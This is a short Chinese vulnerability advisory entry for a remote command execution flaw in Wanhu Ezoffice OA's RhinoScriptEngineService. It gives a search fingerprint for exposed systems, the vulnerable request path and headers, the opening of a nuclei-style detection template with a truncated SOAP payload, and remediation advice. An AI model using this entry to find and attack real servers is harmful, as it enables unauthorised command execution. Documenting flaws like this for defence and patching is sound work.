# 万户协同办公平台RhinoScriptEngineService存在远程命令执行

- **系统**：万户协同办公平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`POST /defaultroot/services/./././RhinoScriptEngineService HTTP/1.1`

**请求体 / payload**
```
1. Hunter
app.name="万户 Ezoffice OA"
2、隐患url,复现如下
id: wanhu-RhinoScriptEngineService-rce
info:
name: wanhu-RhinoScriptEngineService-rce
author: xxxx
severity: critical
variables:
suijizifu: "{{to_lower(rand_base(8))}}"
http:
- raw:
-
Host: {{Hostname}}
Content-Type: text/xml;charset=UTF-8
SOAPAction: '""'
Content-Length: 1211
<?xml version='1.0' encoding='UTF-8'?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
<soapenv:Body…（脚本共 1277 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。